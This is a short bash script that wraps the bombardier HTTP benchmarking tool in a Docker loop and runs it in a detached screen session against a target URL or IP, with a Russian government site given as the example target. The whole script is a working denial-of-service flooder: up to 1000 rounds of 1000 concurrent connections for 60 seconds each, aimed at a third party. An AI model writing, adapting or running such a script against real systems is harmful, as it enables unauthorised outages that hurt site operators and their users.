#!/bin/bash

TARGET=$1

if [ -z "$TARGET" ]
then
      echo "Target URL or IP is required, e.g. http://www.fsb.ru"
      exit 0
fi

screen -S work -d -m bash -c "for i in {1..1000}; do sudo docker run -it alpine/bombardier -c 1000 -d 60s -l $TARGET && sleep 5; done"

echo "Bombardier: $TARGET"

